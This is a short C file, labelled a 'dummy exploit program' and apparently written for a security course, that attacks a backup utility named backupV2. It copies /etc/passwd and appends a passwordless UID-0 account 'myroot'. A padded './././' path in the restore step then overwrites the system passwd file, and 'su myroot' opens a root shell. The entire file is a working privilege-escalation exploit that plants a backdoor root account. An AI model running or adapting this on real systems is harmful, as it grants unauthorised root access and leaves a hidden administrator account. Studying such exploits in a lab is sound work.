/*                                                                                                       
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define TARGET "/usr/local/bin/backupV2" // or backupV2

int main(void)
{
  char *args[4];
  char *env[1];

  system("cat /etc/passwd > passwd");
  system("echo 'myroot::0:0:root:/root:/bin/bash' >> passwd");
  system("backupV2 backup passwd");
  system("cd /etc/ && backupV2 restore ./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././passwd");

  system("su myroot");
}

